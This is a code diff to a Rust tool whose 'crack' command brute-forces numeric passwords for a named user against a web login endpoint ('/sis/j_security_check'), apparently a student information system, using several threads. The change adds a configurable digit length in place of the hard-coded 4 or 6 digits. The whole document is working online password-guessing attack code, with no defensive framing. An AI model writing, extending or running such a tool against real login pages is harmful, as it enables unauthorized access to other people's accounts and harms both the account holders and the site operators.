@@ -29,7 +29,7 @@ pub fn command() -> Command {
     Command::new(
         "crack",
         "Crack A password",
-        "crack <username> [-t Threads] [-p Prefix] [-nc No Cache] [--cache Cache Path] [--page BasePage]",
+        "crack <username> [-t Threads] [-p Prefix] [-nc No Cache] [--len Digets to Crack] [--cache Cache Path] [--page BasePage]",
         |args| {
             if args.len() <= 2 {
                 color_print!(Color::Red, "[*] Not enough args supplied");
@@ -45,6 +45,7 @@ pub fn command() -> Command {
                 .unwrap();
             let prefix: &str = arg_parse::get_arg_value(args, "-p").unwrap_or("30");
             let no_cache: bool = arg_parse::get_arg_value(args, "-nc").is_some();
+            let pass_len: u32 = arg_parse::get_arg_value(args, "--len").unwrap_or("4").parse().unwrap();
             let cache_path: &str = arg_parse::get_arg_value(args, "--cache").unwrap_or_else(|| default_cache.to_str().unwrap());
             let base_page: &str = arg_parse::get_arg_value(args, "--page").unwrap_or(BASE_PAGE);
 
@@ -84,6 +85,7 @@ pub fn command() -> Command {
 
             color_print!(Color::Magenta, "[i] Prefix: {}", prefix);
             color_print!(Color::Magenta, "[i] Threads: {}", &threads.to_string());
+            color_print!(Color::Magenta, "[i] Crack Length: {}", &pass_len.to_string());
             color_print!(Color::Magenta, "[i] Cache: {}", cache.unwrap_or("None"));
             color_print!(Color::Magenta, "[i] Base Page: {}", base_page);
             println!();
@@ -122,7 +124,7 @@ pub fn command() -> Command {
             }
 
             // C R A C K
-            crack(&username, *threads as u32, base_page, prefix, cache);
+            crack(&username, *threads as u32, base_page, prefix, pass_len, cache);
         },
     )
 }
@@ -170,6 +172,7 @@ impl Cracker {
             base_url: self.base_url,
         }
     }
+
     fn start(&self, tx: mpsc::Sender<Message>) {
         // Login Page
         let page: &str = &format!("{}/sis/j_security_check", self.base_url);
@@ -250,23 +253,29 @@ enum Message {
     End,
 }
 
-pub fn crack(username: &str, threads: u32, base_url: &str, raw_prefix: &str, cache: Option<&str>) {
+pub fn crack(
+    username: &str,
+    threads: u32,
+    base_url: &str,
+    raw_prefix: &str,
+    crack_len: u32,
+    cache: Option<&str>,
+) {
     // Start Timer
     let start_time = SystemTime::now();
 
-    let mut passwords = 9999;
-    let mut password_len = 4;
-
-    let mut prefix = &*raw_prefix;
-    if prefix == "*" {
-        prefix = "";
-        passwords = 999999;
-        password_len = 6;
+    // Gen upper limit for passwod search
+    // Ex for 4 diget password (2 diget prefix) this will giv 9999
+    let mut passwords = 9;
+    for _ in 1..crack_len {
+        passwords *= 10;
+        passwords += 9;
     }
 
     // Make a new System
     let mut system: System = System::new(passwords, threads);
 
+    // Add a new cracker to the system for each thread
     for i in 0..system.threads {
         let start_index = system.passwords / system.threads as u32;
         let mut end_index = start_index * (i + 1);
@@ -277,10 +286,10 @@ pub fn crack(username: &str, threads: u32, base_url: &str, raw_prefix: &str, cac
             i,
             end_index,
             start_index * i,
-            password_len,
+            crack_len,
             username,
             base_url,
-            prefix,
+            raw_prefix,
         ));
     }
 
